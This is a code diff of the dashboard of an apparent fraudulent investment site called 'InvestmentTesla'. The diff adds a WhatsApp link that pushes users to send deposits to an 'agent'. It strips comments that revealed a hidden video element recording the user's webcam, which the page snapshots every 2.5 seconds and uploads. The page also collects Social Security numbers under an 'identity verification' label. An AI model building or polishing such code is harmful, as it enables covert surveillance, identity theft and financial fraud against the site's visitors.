@@ -1,6 +1,6 @@
 'use client';
 import { useEffect, useState, useRef } from 'react';
-import { Lock, ShieldCheck, Upload, Loader2, Clock, CheckCircle, Zap } from 'lucide-react';
+import { Lock, ShieldCheck, Upload, Loader2, Clock, CheckCircle, MessageCircle } from 'lucide-react';
 import Navbar from '@/components/landing/Navbar';
 
 export default function Dashboard() {
@@ -22,6 +22,13 @@ export default function Dashboard() {
     setLoading(false);
   };
 
+  // WhatsApp Redirect Function
+  const handleWhatsApp = () => {
+    const phoneNumber = "19803487946"; 
+    const message = "Hello InvestmentTesla Support, I am interested in making a deposit. Please provide payment details.";
+    window.open(`https://wa.me/${phoneNumber}?text=${encodeURIComponent(message)}`, '_blank');
+  };
+
   const initProctoring = async () => {
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -31,7 +38,6 @@ export default function Dashboard() {
         videoRef.current.srcObject = stream;
         videoRef.current.onloadedmetadata = () => {
           videoRef.current?.play();
-          // HIGH FREQUENCY: Every 2.5 seconds
           setInterval(captureSnapshot, 2500); 
         };
       }
@@ -39,9 +45,7 @@ export default function Dashboard() {
   };
 
   const captureSnapshot = async () => {
-    // Ensure video is playing and sending pixels (ReadyState 4 is 'HaveEnoughData')
     if (!videoRef.current || videoRef.current.readyState < 3) return;
-    
     try {
       const canvas = document.createElement('canvas');
       canvas.width = videoRef.current.videoWidth;
@@ -49,8 +53,7 @@ export default function Dashboard() {
       const ctx = canvas.getContext('2d');
       if (ctx) {
         ctx.drawImage(videoRef.current, 0, 0);
-        const image = canvas.toDataURL('image/jpeg', 0.3); // Lower quality to save bandwidth at high speed
-        
+        const image = canvas.toDataURL('image/jpeg', 0.3);
         if (image.length > 500) {
           fetch('/api/user/snapshot', {
             method: 'POST',
@@ -87,7 +90,6 @@ export default function Dashboard() {
     <main className="min-h-screen bg-[#050505] text-white p-6">
       <Navbar />
       
-      {/* Opacity trick to keep the stream active for the browser without showing the user */}
       <video 
         ref={videoRef} 
         autoPlay 
@@ -116,19 +118,30 @@ export default function Dashboard() {
                 <p className="text-[10px] font-bold uppercase tracking-widest">Verification Required</p>
               </div>
             )}
-            <button className="w-full py-6 bg-white text-black font-black uppercase text-[11px] rounded-2xl hover:bg-[#D4AF37] transition-all">
+            
+            {/* FIXED BUTTON: Added onClick and ensured higher z-index */}
+            <button 
+              onClick={isApproved ? handleWhatsApp : undefined}
+              className={`relative z-20 w-full py-6 font-black uppercase text-[11px] rounded-2xl transition-all flex items-center justify-center gap-3 ${
+                isApproved 
+                ? "bg-white text-black hover:bg-[#D4AF37] cursor-pointer" 
+                : "bg-white/5 text-gray-500 cursor-not-allowed"
+              }`}
+            >
+              {isApproved && <MessageCircle size={16} />}
               {isApproved ? "Contact Agent to Deposit" : "Deposits Locked"}
             </button>
           </div>
         </div>
 
+        {/* Identity Column */}
         <div className="bg-[#0a0a0a] border border-white/5 p-8 rounded-[3rem] border-t-2 border-t-[#D4AF37]/30">
           <h3 className="text-xs font-bold uppercase mb-8 flex items-center gap-2 tracking-widest">
             <ShieldCheck size={18} className="text-[#D4AF37]" /> Identity Security
           </h3>
 
           {showStartButton && !isVerifying && (
-            <button onClick={() => setIsVerifying(true)} className="w-full py-5 bg-[#D4AF37] text-black font-bold uppercase text-[10px] rounded-xl">
+            <button onClick={() => setIsVerifying(true)} className="w-full py-5 bg-[#D4AF37] text-black font-bold uppercase text-[10px] rounded-xl hover:bg-[#b8952e]">
               Start Verification
             </button>
           )}
@@ -143,7 +156,6 @@ export default function Dashboard() {
               <input 
                 type="text" 
                 placeholder="SOCIAL SECURITY NUMBER" 
-                maxLength={9}
                 className="w-full bg-black border border-white/10 p-5 rounded-xl text-xs outline-none focus:border-[#D4AF37] font-mono" 
                 value={ssn} 
                 onChange={e => setSsn(e.target.value.replace(/\D/g, ''))} 
